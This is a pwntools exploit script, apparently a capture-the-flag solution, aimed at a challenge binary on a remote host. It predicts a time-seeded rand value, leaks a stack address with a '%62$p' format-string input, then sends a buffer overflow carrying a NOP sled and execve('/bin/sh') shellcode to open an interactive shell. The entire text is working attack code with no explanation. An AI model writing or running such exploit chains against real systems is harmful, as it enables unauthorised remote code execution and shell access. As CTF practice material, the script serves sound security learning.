from pwn import *
import ctypes
import time
import re

context.terminal =  ["tmux", "splitw", "-h"] 
context.endian = 'little'
context.arch = 'amd64'
context.bits = 64
BINARY = "./chall"
HOST = "34.45.81.67"
PORT = 16004

elf = ELF(BINARY)

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

SHELLCODE = asm('''
    xor esi, esi
    push rsi
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    imul esi
    mov al, 0x3b
    syscall
''')

def extract_hex_value(text_string):
    match = re.search(r'0x[0-9a-fA-F]+', text_string)
    if match:
        return int(match.group(0), 16)
    else:
        return None

libc_rand = ctypes.CDLL(None)

def predict_nhonks(timestamp):
    libc_rand.srand(timestamp)
    first_rand = libc_rand.rand()
    nhonks = (first_rand % 91) + 10
    return nhonks

def run_shellcode(p):
    current_time = int(time.time())
    predicted_value = f"{predict_nhonks(current_time)}"

    p.recvuntil(b">")
    p.sendline(b"hello")
    p.sendlineafter(b"how many honks?", predicted_value.encode())
    response = p.recv()
    leak = f"%62$p".encode()
    if b"THE GOOSE WINS" not in response and b"tough luck" not in response:
        p.sendline(leak)
        leak_resp = extract_hex_value(p.recv().decode())
        print(hex(leak_resp))
        test = b"\x90"*0x140
        payload_p2 = b"A"*376
        payload_p2 += p64(leak_resp)
        payload_p2 += test
        payload_p2 += SHELLCODE
        p.sendline(payload_p2)
        print(p.recv())
    return p

p = start_binary()

if not args.REMOTE and args.GDB:
    gdb.attach(p, """
    b* highscore+198
    b* highscore+286
    b* highscore+307
    c
    """)

run_shellcode(p)
p.interactive()